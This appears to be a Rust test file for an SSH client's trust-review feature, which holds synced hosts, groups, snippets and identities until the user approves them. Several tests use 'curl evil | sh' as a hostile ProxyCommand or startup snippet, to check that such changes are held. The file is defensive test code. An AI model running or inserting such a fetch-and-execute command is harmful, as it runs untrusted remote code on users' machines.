// SPDX-FileCopyrightText: 2026 Tauminus contributors
// SPDX-License-Identifier: GPL-3.0-or-later

use tauminus_domain::{Group, GroupId, Host, HostName, Label, Route, Settings, Snippet, SnippetId};

use super::*;
use crate::fakes::{FakeHostStore, FakeSnippetStore, FakeTrustStore};
use crate::ports::TrustStore;

fn hid(id: &str) -> HostId {
    HostId::parse(id).unwrap()
}

fn sid(id: &str) -> Subject {
    Subject::Host(hid(id))
}

fn host(id: &str) -> Host {
    Host::new(
        hid(id),
        Label::parse(id).unwrap(),
        HostName::parse("db.internal").unwrap(),
    )
}

fn snippet(id: &str, body: &str) -> Snippet {
    Snippet::new(
        SnippetId::parse(id).unwrap(),
        Label::parse(id).unwrap(),
        None,
        body.into(),
    )
    .unwrap()
}

struct Fixture {
    hosts: HostBook,
    snippets: SnippetBook,
    notes: Arc<FakeTrustStore>,
    trust: Trust,
}

async fn fixture() -> Fixture {
    let notes = Arc::new(FakeTrustStore::default());
    Fixture {
        hosts: HostBook::open(Arc::new(FakeHostStore::default()))
            .await
            .unwrap(),
        snippets: SnippetBook::open(Arc::new(FakeSnippetStore::default()))
            .await
            .unwrap(),
        trust: Trust::open(notes.clone()).await.unwrap(),
        notes,
    }
}

impl Fixture {
    async fn data(&self) -> SyncData {
        SyncData {
            hosts: self.hosts.snapshot().await,
            snippets: self.snippets.snapshot().await,
            identities: Vec::new(),
        }
    }

    /// What `Syncer::run` does with a merge: note it, then save it.
    async fn sync(&self, after: SyncData) {
        let before = self.data().await;
        self.trust
            .note((&before, &Prints::new()), (&after, &Prints::new()))
            .await
            .unwrap();
        assert!(
            self.hosts
                .replace_if(&before.hosts, after.hosts)
                .await
                .unwrap()
        );
        assert!(
            self.snippets
                .replace_if(&before.snippets, after.snippets)
                .await
                .unwrap()
        );
    }

    async fn check(&self, id: &str) -> Result<(), TrustError> {
        self.trust
            .check(
                &self.hosts,
                Some(&self.snippets),
                async |_| Prints::new(),
                &hid(id),
            )
            .await
    }

    async fn review(&self, id: &str) -> Review {
        match self.check(id).await {
            Err(TrustError::NeedsReview(review)) => *review,
            other => panic!("{id} needs no review: {other:?}"),
        }
    }
}

#[tokio::test]
async fn a_host_from_another_device_waits_until_accepted_as_shown() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    after.hosts.put_host(host("other")).unwrap();
    f.sync(after).await;
    let review = f.review("theirs").await;
    assert!(review.new);
    assert_eq!(review.lines[0].value, "db.internal");
    let page = f
        .trust
        .pending(&f.hosts, Some(&f.snippets), &Prints::new(), 1)
        .await
        .unwrap();
    assert_eq!(page.noted, 2);
    assert_eq!(page.reviews.len(), 1, "one page");
    assert_eq!(page.reviews[0].subject, sid("other"));

    // Changed after it was shown: the user sees it again.
    f.hosts
        .edit(|inventory| {
            let mut h = host("theirs");
            h.settings.port = Some(2222);
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let other = f.review("other").await;
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[
                (sid("theirs"), review.fingerprint),
                (sid("other"), other.fingerprint),
            ],
        )
        .await
        .unwrap();
    assert_eq!(stale, [sid("theirs")], "accepted what the user did not see");
    f.check("other").await.unwrap();
    let now = f.review("theirs").await;
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[(sid("theirs"), now.fingerprint)],
        )
        .await
        .unwrap();
    assert_eq!(stale, []);
    f.check("theirs").await.unwrap();
    let left = f
        .trust
        .pending(&f.hosts, Some(&f.snippets), &Prints::new(), 50)
        .await
        .unwrap();
    assert_eq!(left.reviews, []);
    // The next sync that leaves them as accepted drops the notes.
    f.sync(f.data().await).await;
    assert!(f.notes.saved().is_empty());
}

#[tokio::test]
async fn an_accept_between_a_note_and_its_save_holds_what_the_save_brings() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    // A sync notes, finding the host noted already, but has not saved.
    let before = f.data().await;
    let mut after = before.clone();
    let mut evil = host("theirs");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil).unwrap();
    f.trust
        .note((&before, &Prints::new()), (&after, &Prints::new()))
        .await
        .unwrap();
    // The user accepts what was shown, which is still what is saved.
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[(sid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    assert_eq!(stale, []);
    f.check("theirs").await.unwrap();
    // Then the sync saves: what it brought is held.
    assert!(
        f.hosts
            .replace_if(&before.hosts, after.hosts)
            .await
            .unwrap()
    );
    let held = f.check("theirs").await;
    assert!(matches!(held, Err(TrustError::NeedsReview(_))), "{held:?}");
}

#[tokio::test]
async fn a_note_another_window_saved_is_seen_here() {
    let notes = Arc::new(FakeTrustStore::default());
    let f = fixture().await;
    let other = Trust::open(notes.clone()).await.unwrap();
    let here = Trust::open(notes.clone()).await.unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    other
        .note((&f.data().await, &Prints::new()), (&after, &Prints::new()))
        .await
        .unwrap();
    f.hosts
        .replace_if(&f.data().await.hosts, after.hosts)
        .await
        .unwrap();
    let seen = here
        .check(
            &f.hosts,
            Some(&f.snippets),
            async |_| Prints::new(),
            &hid("theirs"),
        )
        .await;
    assert!(matches!(seen, Err(TrustError::NeedsReview(_))), "{seen:?}");
}

#[tokio::test]
async fn a_synced_group_proxy_command_gates_its_hosts_and_local_edits_do_not() {
    let f = fixture().await;
    let group = Group {
        id: GroupId::parse("g").unwrap(),
        name: Label::parse("g").unwrap(),
        parent: None,
        settings: Settings::default(),
    };
    f.hosts
        .edit(|inventory| {
            inventory.put_group(group.clone())?;
            let mut h = host("mine");
            h.group = Some(group.id.clone());
            inventory.put_host(h)
        })
        .await
        .unwrap();
    // A local edit, outside a sync, is the user's own.
    f.hosts
        .edit(|inventory| {
            let mut g = group.clone();
            g.settings.port = Some(2200);
            inventory.put_group(g)
        })
        .await
        .unwrap();
    f.check("mine").await.unwrap();

    let mut after = f.data().await;
    let mut g = after.hosts.group(&group.id).unwrap().clone();
    g.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_group(g).unwrap();
    f.sync(after).await;
    let review = f.review("mine").await;
    assert!(!review.new);
    assert!(
        review
            .lines
            .iter()
            .any(|l| l.level == 1 && l.field == "route" && l.value.contains("curl evil")),
        "{:?}",
        review.lines
    );

    // A second sync keeps what was approved, not what the first brought.
    let mut after = f.data().await;
    let mut g = after.hosts.group(&group.id).unwrap().clone();
    g.settings.route = None;
    after.hosts.put_group(g).unwrap();
    f.sync(after).await;
    f.check("mine").await.unwrap();
}

#[tokio::test]
async fn a_synced_snippet_edit_gates_the_hosts_it_starts_on() {
    let f = fixture().await;
    f.snippets
        .edit(|library| library.put(snippet("s", "uptime\n")))
        .await
        .unwrap();
    f.hosts
        .edit(|inventory| {
            let mut h = host("mine");
            h.startup = vec![SnippetId::parse("s").unwrap()];
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut after = f.data().await;
    after
        .snippets
        .put(snippet("s", "curl evil | sh\n"))
        .unwrap();
    f.sync(after).await;
    assert_eq!(
        f.review("mine").await.startup,
        "curl evil | sh\r",
        "as typed"
    );

    // Snippets that cannot be read type nothing: still refused.
    let unread = f
        .trust
        .check(&f.hosts, None, async |_| Prints::new(), &hid("mine"))
        .await;
    assert!(
        matches!(unread, Err(TrustError::NeedsReview(_))),
        "{unread:?}"
    );
}

#[tokio::test]
async fn a_host_gone_loses_its_note_and_a_failed_save_keeps_the_old_notes() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let mut after = f.data().await;
    after.hosts.remove_host(&hid("theirs")).unwrap();
    after.hosts.put_host(host("other")).unwrap();
    f.notes.fail_next();
    let before = f.data().await;
    assert!(
        f.trust
            .note((&before, &Prints::new()), (&after, &Prints::new()))
            .await
            .is_err()
    );
    assert_eq!(f.notes.saved().len(), 1);
    f.review("theirs").await;
    f.sync(after).await;
    assert_eq!(f.notes.saved().keys().collect::<Vec<_>>(), [&sid("other")]);
}

#[test]
fn the_fingerprint_covers_every_line_and_the_startup_text() {
    let mut inventory = Inventory::default();
    let mut h = host("h");
    h.startup = vec![SnippetId::parse("s").unwrap()];
    inventory.put_host(h.clone()).unwrap();
    let mut library = Library::default();
    let print = |inventory: &Inventory, library: &Library| {
        fingerprint(inventory, library, &Prints::new(), &hid("h")).unwrap()
    };
    let missing = print(&inventory, &library);
    library.put(snippet("s", "ls\n")).unwrap();
    let ls = print(&inventory, &library);
    assert_ne!(missing, ls, "a snippet arriving under a skipped id");
    library.put(snippet("s", "ls -a\n")).unwrap();
    assert_ne!(print(&inventory, &library), ls);
    h.settings.forward_agent = Some(true);
    let before = print(&inventory, &library);
    inventory.put_host(h).unwrap();
    assert_ne!(print(&inventory, &library), before);
}

#[tokio::test]
async fn a_synced_removal_of_the_prod_tag_is_held() {
    let f = fixture().await;
    f.hosts
        .edit(|inventory| {
            let mut h = host("db");
            h.set_tags(vec![tauminus_domain::Tag::parse("prod").unwrap()])?;
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("db")).unwrap();
    f.sync(after).await;
    f.review("db").await;
}

/// Notes another window dropped after this one read them: the first load
/// gives `stale`, every later one the store as it is.
struct Stale {
    first: std::sync::Mutex<Option<Approvals>>,
    store: FakeTrustStore,
}

impl TrustStore for Stale {
    fn load(
        &self,
    ) -> crate::ports::BoxFuture<'_, Result<(Arc<Approvals>, crate::ports::StoreVersion), StoreError>>
    {
        let stale = self.first.lock().unwrap().take();
        Box::pin(async move {
            let (now, version) = self.store.load().await?;
            Ok((stale.map_or(now, Arc::new), version))
        })
    }

    fn save<'a>(
        &'a self,
        approvals: &'a Approvals,
        read: crate::ports::StoreVersion,
    ) -> crate::ports::BoxFuture<'a, Result<(), StoreError>> {
        self.store.save(approvals, read)
    }
}

#[tokio::test]
async fn a_note_another_window_drops_meanwhile_is_made_again() {
    let f = fixture().await;
    f.hosts
        .edit(|inventory| inventory.put_host(host("x")))
        .await
        .unwrap();
    let before = f.data().await;
    let approved = fingerprint(&before.hosts, &before.snippets, &Prints::new(), &hid("x")).unwrap();
    let mut seen = Approvals::new();
    seen.insert(sid("x"), Some(approved));
    let store = Arc::new(Stale {
        first: std::sync::Mutex::new(Some(seen)),
        store: FakeTrustStore::default(),
    });
    let trust = Trust::open(store.clone()).await.unwrap();
    let mut after = before.clone();
    let mut evil = host("x");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil).unwrap();
    trust
        .note((&before, &Prints::new()), (&after, &Prints::new()))
        .await
        .unwrap();
    assert_eq!(store.store.saved().get(&sid("x")), Some(&Some(approved)));
}

#[tokio::test]
async fn an_accepted_host_stays_accepted_through_the_user_s_own_edit() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[(sid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    let library = f.snippets.snapshot().await;
    let edit = |port| {
        let mut h = host("theirs");
        h.settings.port = Some(port);
        h
    };
    let (before, now) = f
        .hosts
        .edit_both(|inventory| inventory.put_host(edit(2222)))
        .await
        .unwrap();
    f.trust
        .rebase(
            (&before, &library, &Prints::new()),
            (&now, &library, &Prints::new()),
        )
        .await
        .unwrap();
    f.check("theirs").await.unwrap();

    // A sync saved other values between the edit and its rebase: held.
    let (before, now) = f
        .hosts
        .edit_both(|inventory| inventory.put_host(edit(2200)))
        .await
        .unwrap();
    let mut synced = f.data().await;
    let mut evil = edit(2200);
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    synced.hosts.put_host(evil).unwrap();
    f.sync(synced).await;
    f.trust
        .rebase(
            (&before, &library, &Prints::new()),
            (&now, &library, &Prints::new()),
        )
        .await
        .unwrap();
    f.review("theirs").await;
}

#[tokio::test]
async fn a_local_edit_of_a_host_still_held_keeps_it_held() {
    let f = fixture().await;
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[(sid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    // Another device changes it; this one has not reviewed that.
    let mut after = f.data().await;
    let mut evil = host("theirs");
    evil.settings.route = Some(Route::ProxyCommand("curl evil | sh".into()));
    after.hosts.put_host(evil.clone()).unwrap();
    f.sync(after).await;
    let library = f.snippets.snapshot().await;
    let (before, now) = f
        .hosts
        .edit_both(|inventory| {
            evil.settings.port = Some(2222);
            inventory.put_host(evil)
        })
        .await
        .unwrap();
    f.trust
        .rebase(
            (&before, &library, &Prints::new()),
            (&now, &library, &Prints::new()),
        )
        .await
        .unwrap();
    f.review("theirs").await;
}

#[tokio::test]
async fn a_snippet_a_sync_changes_after_the_user_lists_it_is_held() {
    let f = fixture().await;
    f.snippets
        .edit(|library| library.put(snippet("s2", "uptime\n")))
        .await
        .unwrap();
    let mut after = f.data().await;
    after.hosts.put_host(host("theirs")).unwrap();
    f.sync(after).await;
    let shown = f.review("theirs").await;
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &Prints::new(),
            &[(sid("theirs"), shown.fingerprint)],
        )
        .await
        .unwrap();
    // As the app does: the library is read before the host edit.
    let library = f.snippets.snapshot().await;
    let (before, now) = f
        .hosts
        .edit_both(|inventory| {
            let mut h = host("theirs");
            h.startup = vec![SnippetId::parse("s2").unwrap()];
            inventory.put_host(h)
        })
        .await
        .unwrap();
    let mut synced = f.data().await;
    synced
        .snippets
        .put(snippet("s2", "curl evil | sh\n"))
        .unwrap();
    f.sync(synced).await;
    f.trust
        .rebase(
            (&before, &library, &Prints::new()),
            (&now, &library, &Prints::new()),
        )
        .await
        .unwrap();
    f.review("theirs").await;
}

#[test]
fn the_keyed_digest_is_hmac_sha256_over_length_prefixed_parts() {
    // RFC 4231's first key, zero-padded as HMAC pads it; the message is the
    // part's length as 8 bytes, then the part. Checked against Python's
    // `hmac`.
    let mut key = [0u8; 32];
    key[..20].copy_from_slice(&[0x0b; 20]);
    let hex = keyed_digest(&key, &[b"Hi There"])
        .iter()
        .fold(String::new(), |mut hex, b| {
            use std::fmt::Write as _;
            let _ = write!(hex, "{b:02x}");
            hex
        });
    assert_eq!(
        hex,
        "7f576cd063ed3e3615e6bf957fc801d0f4d8cf70bc1a604ab2ba1d06c8732e2e"
    );
}

fn print(digest: u8) -> IdentityPrint {
    IdentityPrint {
        digest: [digest; 32],
        lines: vec![("identity user", "ops".into())],
    }
}

#[tokio::test]
async fn a_shared_identity_changed_elsewhere_holds_the_hosts_using_it() {
    let f = fixture().await;
    f.hosts
        .edit(|inventory| {
            let mut h = host("db");
            h.settings.identity = Some(tauminus_domain::IdentityId::parse("id1").unwrap());
            inventory.put_host(h)?;
            inventory.put_host(host("other"))
        })
        .await
        .unwrap();
    let data = f.data().await;
    let was = Prints::from([("id1".to_owned(), print(1))]);
    let now = Prints::from([("id1".to_owned(), print(2))]);
    f.trust.note((&data, &was), (&data, &now)).await.unwrap();
    let held = f
        .trust
        .check(
            &f.hosts,
            Some(&f.snippets),
            async |_| now.clone(),
            &hid("db"),
        )
        .await;
    let Err(TrustError::NeedsReview(review)) = held else {
        panic!("a changed identity is used unseen: {held:?}");
    };
    assert!(
        review
            .lines
            .iter()
            .any(|l| l.place == "identity" && l.field == "identity user"),
        "{:?}",
        review.lines
    );
    f.check("other").await.unwrap();
    // As it was before: the change did not land after all.
    f.trust
        .check(
            &f.hosts,
            Some(&f.snippets),
            async |_| was.clone(),
            &hid("db"),
        )
        .await
        .unwrap();
    // The user's own edit of it moves the note along.
    let library = f.snippets.snapshot().await;
    f.trust
        .rebase((&data.hosts, &library, &was), (&data.hosts, &library, &now))
        .await
        .unwrap();
    f.trust
        .check(
            &f.hosts,
            Some(&f.snippets),
            async |_| now.clone(),
            &hid("db"),
        )
        .await
        .unwrap();
}

#[test]
fn a_subject_reads_back_as_written_and_a_host_id_never_passes_for_an_identity() {
    for text in ["db", "identity:k1"] {
        assert_eq!(Subject::parse(text).unwrap().to_string(), text);
    }
    assert_eq!(
        Subject::parse("identity:k1"),
        Some(Subject::Identity("k1".into()))
    );
    for bad in ["identity:", "identity:a b", "a:b", ""] {
        assert_eq!(Subject::parse(bad), None, "{bad}");
    }
}

fn print_of(digest: u8) -> IdentityPrint {
    IdentityPrint {
        digest: [digest; 32],
        lines: vec![("identity", "deploy".into())],
    }
}

#[tokio::test]
async fn an_identity_a_sync_changed_waits_and_the_user_s_own_edit_moves_its_note() {
    let f = fixture().await;
    let data = f.data().await;
    let prints = |d| Prints::from([("k1".to_owned(), print_of(d))]);
    let check = async |p: &Prints| f.trust.check_identity(async |_| p.clone(), "k1").await;
    f.trust
        .note((&data, &Prints::new()), (&data, &prints(1)))
        .await
        .unwrap();
    assert!(matches!(check(&prints(1)).await, Err(TrustError::NeedsReview(r)) if r.new));
    let stale = f
        .trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &prints(1),
            &[(Subject::Identity("k1".into()), Fingerprint([1; 32]))],
        )
        .await
        .unwrap();
    assert_eq!(stale, []);
    check(&prints(1)).await.unwrap();
    // Another device changes it: held, and shown as it is now.
    f.trust
        .note((&data, &prints(1)), (&data, &prints(2)))
        .await
        .unwrap();
    match check(&prints(2)).await {
        Err(TrustError::NeedsReview(review)) => {
            assert_eq!(review.label, "deploy");
            assert_eq!(review.lines[0].place, "identity");
        }
        other => panic!("{other:?}"),
    }
    // An edit here of what was approved moves the approval along.
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &prints(2),
            &[(Subject::Identity("k1".into()), Fingerprint([2; 32]))],
        )
        .await
        .unwrap();
    let (inventory, library) = (f.hosts.snapshot().await, f.snippets.snapshot().await);
    f.trust
        .rebase(
            (&inventory, &library, &prints(2)),
            (&inventory, &library, &prints(3)),
        )
        .await
        .unwrap();
    check(&prints(3)).await.unwrap();
    // Locked, there is no print: held.
    assert!(check(&Prints::new()).await.is_err());
}

#[tokio::test]
async fn a_host_with_no_note_waits_while_the_identity_it_uses_does() {
    let f = fixture().await;
    let data = f.data().await;
    let was = Prints::from([("k1".to_owned(), print_of(1))]);
    let now = Prints::from([("k1".to_owned(), print_of(2))]);
    let check = async |p: &Prints| {
        f.trust
            .check(
                &f.hosts,
                Some(&f.snippets),
                async |_| p.clone(),
                &hid("mine"),
            )
            .await
    };
    // A sync changes the identity; then a host made here uses it.
    f.trust.note((&data, &was), (&data, &now)).await.unwrap();
    let mut mine = host("mine");
    mine.settings.identity = Some(tauminus_domain::IdentityId::parse("k1").unwrap());
    f.hosts.edit(|i| i.put_host(mine)).await.unwrap();
    assert!(
        !f.notes.saved().contains_key(&sid("mine")),
        "no note of its own"
    );
    match check(&now).await {
        Err(TrustError::NeedsReview(review)) => {
            assert_eq!(review.subject, Subject::Identity("k1".into()));
        }
        other => panic!("{other:?}"),
    }
    f.trust
        .accept(
            &f.hosts,
            Some(&f.snippets),
            &now,
            &[(Subject::Identity("k1".into()), Fingerprint([2; 32]))],
        )
        .await
        .unwrap();
    check(&now).await.unwrap();
    // An id no vault makes is never noted: the list must read back.
    let bad = Prints::from([("a:b".to_owned(), print_of(3))]);
    f.trust
        .note((&data, &Prints::new()), (&data, &bad))
        .await
        .unwrap();
    assert!(
        f.notes
            .saved()
            .keys()
            .all(|s| s.to_string() != "identity:a:b")
    );
}
